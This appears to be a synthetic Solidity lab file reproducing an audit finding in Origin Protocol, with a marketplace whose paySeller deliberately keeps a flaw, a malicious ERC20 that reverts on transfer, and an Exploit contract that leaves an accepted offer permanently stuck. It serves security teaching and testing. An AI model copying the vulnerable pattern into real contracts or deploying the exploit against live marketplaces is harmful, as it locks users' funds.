// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Origin Protocol — arbitrary ERC20 bricks offer finalization (Trail of Bits)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: makeOffer stores any ERC20 as the offer currency, and paySeller
    will not finish unless that currency's transfer returns true. A token that
    reverts on transfer leaves the accepted offer stuck. Vulnerable line
    preserved verbatim below (@> VULN). */

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract MaliciousERC20 {
    function transfer(address, uint256) external pure returns (bool) {
        revert("Transfer failed");
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }
}

contract Seller {
    function create(Marketplace market) external returns (uint256) {
        return market.createListing();
    }

    function accept(Marketplace market, uint256 listingID, uint256 offerID) external {
        market.acceptOffer(listingID, offerID);
    }

    function tryFinalize(Marketplace market, uint256 listingID, uint256 offerID) external returns (bool) {
        try market.finalize(listingID, offerID) {
            return true;
        } catch {
            return false;
        }
    }
}

contract Marketplace {
    struct Listing {
        address seller;
    }

    struct Offer {
        uint8 status;
        address buyer;
        address currency;
        uint256 value;
        uint256 refund;
    }

    Listing[] public listings;
    mapping(uint256 => Offer[]) public offers;

    function createListing() external returns (uint256 id) {
        id = listings.length;
        listings.push(Listing({seller: msg.sender}));
    }

    function makeOffer(uint256 listingID, address _currency, uint256 _value) external payable {
        offers[listingID].push(
            Offer({status: 1, buyer: msg.sender, currency: _currency, value: _value, refund: 0})
        ); // S2
        if (_currency == address(0)) {
            require(msg.value == _value, "ETH value doesn't match offer");
        } else {
            require(msg.value == 0, "ETH would be lost");
            require(IERC20(_currency).transferFrom(msg.sender, address(this), _value), "transferFrom failed");
        }
    }

    function acceptOffer(uint256 listingID, uint256 offerID) external {
        offers[listingID][offerID].status = 2;
    }

    function finalize(uint256 listingID, uint256 offerID) external {
        paySeller(listingID, offerID);
        offers[listingID][offerID].status = 3;
    }

    function paySeller(uint256 listingID, uint256 offerID) public {
        Listing storage listing = listings[listingID];
        Offer storage offer = offers[listingID][offerID];
        uint256 value = offer.value - offer.refund;
        if (offer.currency == address(0)) {
            require(payable(offer.buyer).send(offer.refund), "ETH refund failed");
            require(payable(listing.seller).send(value), "ETH send failed");
        } else {
            require(IERC20(offer.currency).transfer(offer.buyer, offer.refund), "Refund failed"); // @> VULN: finalization requires the untrusted currency transfer to succeed
            // FIX: let the seller or arbitrator revoke an accepted offer without calling currency, and whitelist currencies
            require(IERC20(offer.currency).transfer(listing.seller, value), "Transfer failed");
        }
    }

    function offerStatus(uint256 listingID, uint256 offerID) external view returns (uint8) {
        return offers[listingID][offerID].status;
    }
}

contract Exploit {
    MaliciousERC20 public token; // nonce 1
    Marketplace public marketplace; // nonce 2 — vulnerable paySeller
    Seller public seller; // nonce 3
    uint256 public listingId;
    bool public finalized;
    bool public stuck;
    uint256 public constant VALUE = 1000 ether;

    constructor() {
        token = new MaliciousERC20();
        marketplace = new Marketplace();
        seller = new Seller();
    }

    function run() external {
        listingId = seller.create(marketplace);
        marketplace.makeOffer(listingId, address(token), VALUE); // S1
        seller.accept(marketplace, listingId, 0); // S3
        finalized = seller.tryFinalize(marketplace, listingId, 0); // S4
        stuck = marketplace.offerStatus(listingId, 0) == 2;
        require(!finalized && stuck, "offer finalized"); // S6
        require(token.balanceOf(address(seller)) == 0, "seller was paid");
    }
}
